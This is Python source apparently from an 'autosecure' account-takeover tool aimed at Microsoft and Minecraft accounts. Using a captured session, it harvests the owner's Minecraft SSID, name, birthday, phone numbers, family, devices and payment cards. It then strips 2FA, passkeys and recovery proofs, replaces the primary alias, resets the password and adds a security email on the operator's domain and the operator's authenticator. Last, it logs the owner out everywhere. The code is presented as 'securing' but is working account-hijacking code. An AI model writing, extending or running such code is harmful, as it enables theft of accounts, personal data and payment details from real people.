from securing.utils.security.change_primary_alias import change_primary_alias
from securing.utils.security.get_security_mail import get_security_email
from securing.utils.security.add_authenticator import add_authenticator
from securing.utils.security.get_recovery_code import get_recovery_code
from securing.utils.security_information import security_information
from securing.utils.security.remove_services import remove_services
from securing.utils.security.remove_devices import remove_devices
from securing.utils.security.delete_aliases import delete_aliases
from securing.utils.security.remove_proof import remove_proof
from securing.utils.security.remove_zyger import remove_zyger
from securing.utils.security.remove_2fa import remove_2fa
from securing.utils.security.recovery import recover

from securing.utils.ogi.get_subscriptions import get_subscriptions
from securing.utils.ogi.get_owner_info import get_owner_info
from securing.utils.ogi.get_contacts import get_contacts
from securing.utils.ogi.get_devices import get_devices
from securing.utils.ogi.get_family import get_family
from securing.utils.ogi.get_cards import get_cards

from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_amrp import get_amrp
from securing.utils.cookies.get_amc import get_amc
from securing.utils.cookies.get_t import get_t

from securing.utils.security.logout_all import logout_all

from minecraft.get_profile import get_profile
from minecraft.get_ssid import get_ssid

from minecraft.get_namechange import get_username_info
from minecraft.get_method import get_method
from minecraft.get_capes import get_capes
from minecraft.get_xbl import get_xbl

from database.database import DBConnection
import httpx
import uuid
import json

async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, account_info: dict):
    # Main file where all processes to securing the account occur

    # To auto update if you edit the config via command
    config = json.load(open("config/config.json", "r"))
    replace_alias = config["autosecure"]["replace_main_alias"]
    enable_2fa = config["autosecure"]["enable_2fa"]
    minecon = config["autosecure"]["minecon_mode"] and not command
    domain = config["domain"]
    
    # Token needed to make API requests for the account
    verification_tokens = await get_amc(session)

    apicanary = await get_cookies(session) 
    
    t = await get_t(session)
    print(f"[+] - Got T ({t})")

    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await get_xbl(session)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        xbl = XBLResponse["xbl"]
        gtg = XBLResponse.get("gtg")
        if gtg:
            account_info["minecraft"]["gamertag"] = gtg

        ssid = await get_ssid(xbl)

        if ssid:
            print("[+] - Got SSID! (Has Minecraft)")
            account_info["minecraft"]["SSID"] = ssid

            try:
                capes = await get_capes(ssid)
            except Exception:
                capes = []
            if capes:
                account_info["minecraft"]["capes"] = ", ".join(
                    i.get("alias", i.get("id", "Unknown")) for i in capes
                )
                print(f"[+] - Got capes")
            else:
                account_info["minecraft"]["capes"] = "No capes"

            profile = await get_profile(ssid)
            if profile:
                print(f"[+] - Got profile (Has Minecraft Java)")
                account_info["minecraft"]["name"] = profile

                usernameInfo = await get_username_info(ssid)
                if not usernameInfo:
                    account_info["minecraft"]["uchange"] = "Yes"
                else:
                    account_info["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
            else:
                print("[x] - No Java profile (Bedrock/Game Pass only)")
                account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
                account_info["minecraft"]["uchange"] = "N/A"

            method = await get_method(ssid)
            if method:
                account_info["minecraft"]["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        account_info["minecraft"]["name"] = "No Minecraft"

    # Gets account info via microsofts API
    subscriptions = await get_subscriptions(session, verification_tokens["home"])
    family = await get_family(session, verification_tokens["home"])
    devices = await get_devices(session, verification_tokens["home"])
    cards = await get_cards(session, verification_tokens["home"])
    contacts = await get_contacts(session, verification_tokens["home"])

    owner_info = await get_owner_info(session, verification_tokens["profile"])

    print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
    account_info["microsoft"]["firstName"] = owner_info["firstName"]
    account_info["microsoft"]["lastName"] = owner_info["lastName"]
    account_info["microsoft"]["fullName"] = owner_info["fullName"]
    account_info["microsoft"]["region"] = owner_info["region"]
    account_info["microsoft"]["birthday"] = owner_info["birthday"]
    account_info["microsoft"]["language"] = owner_info["msaDisplayLanguage"]
    account_info["microsoft"]["phones"] = contacts["msaPhones"] + contacts["mmxPhones"]

    account_info["microsoft"]["family"] = family["members"]
    account_info["microsoft"]["devices"] = devices["devices"]
    account_info["microsoft"]["cards"] = cards["paymentInstruments"]
    account_info["microsoft"]["subscriptions"] = {
        "active":     subscriptions["active"],
        "canceled":   subscriptions["canceled"],
        "commercial": subscriptions["commercial"],
    }
    
    await get_amrp(session, t)
    print(f"[+] - Got AMRP")

    # 2FA
    await remove_2fa(session, apicanary)

    security_parameters = json.loads(await security_information(session))
    main_email = security_parameters["email"]
    print("[+] - Got Security Parameters")
    
    encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]

    existing_recovery = account_info["microsoft"].get("recovery_code")
    has_recovery = existing_recovery and existing_recovery not in ("Couldn't Change!", "Failed to generate")

    if recovery or not has_recovery:
        generated_code = await get_recovery_code(
            session,
            apicanary,
            encryptedNetID
        )
        if generated_code:
            recovery_code = generated_code
        elif has_recovery:
            recovery_code = existing_recovery
        else:
            recovery_code = "Failed to generate"
            print("[X] - Failed to generate recovery code")
    else:
        recovery_code = existing_recovery
        print(f"[+] - Keeping existing recovery code from recovery flow")

    print(f"[+] - Got Recovery Code | {recovery_code}")

    if minecon:
        account_info["microsoft"]["email"] = main_email
        account_info["microsoft"]["password"] = "Unknown"
        account_info["microsoft"]["recovery_code"] = recovery_code

        # Get security mail
        security_email = await get_security_email(session)
        account_info["microsoft"]["security_email"] = security_email
        print(f"[+] - Got Security Email | {security_email}")
    else:
        account_info["microsoft"]["recovery_code"] = recovery_code

    if not minecon:

        # Pass Keys / Windows Hello Exploit
        await remove_zyger(session, apicanary)

        # Removes security_emails / Auth Apps
        await remove_proof(session, apicanary)
        print("[+] - Removed all Proofs")

        # Third Party Launchers (Minecraft, Prism)
        await remove_services(session)

        # Remove Microsoft Devices
        await remove_devices(session, verification_tokens["devices"], devices)

        if security_parameters:

            # Changes Primary Alias
            if replace_alias:
                print("[~] - Changing Primary Alias")
                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
                change_alias = await change_primary_alias(session, primaryEmail, apicanary)
                if change_alias:
                    account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                else:
                    account_info["microsoft"]["email"] = main_email
                    print(f"[X] - Failed to change Primary Email")
            else:
                account_info["microsoft"]["email"] = main_email

            if recovery:

                security_email = uuid.uuid4().hex[:16]
                password = uuid.uuid4().hex[:12]

                security_email = f"{security_email}@{domain}"
                print(f"[+] - Generated Security Email ({security_email})")
                with DBConnection() as database:
                    database.add_security_email(security_email, password)

                # Changes password & generate a new recovery code
                print(f"[~] - Automaticly Securing Account... ({main_email})")
                data = await recover(session, main_email, recovery_code, security_email, password)

                if data and data != "invalid":
                    account_info["microsoft"]["security_email"] = security_email
                    account_info["microsoft"]["recovery_code"] = data
                    account_info["microsoft"]["password"] = password
                else:
                    print(f"[X] - Failed to secure this account")

        # Delete other login aliases
        await delete_aliases(session)

        # Add Authenticator
        if enable_2fa:
            auth = await add_authenticator(session)
            account_info["microsoft"]["auth_secret"] = auth
            print(f"[+] - Added Authenticator ({auth})")

        # Logout all devices
        await logout_all(session, apicanary)
        
    print("[+] - Account has been secured")
    return account_info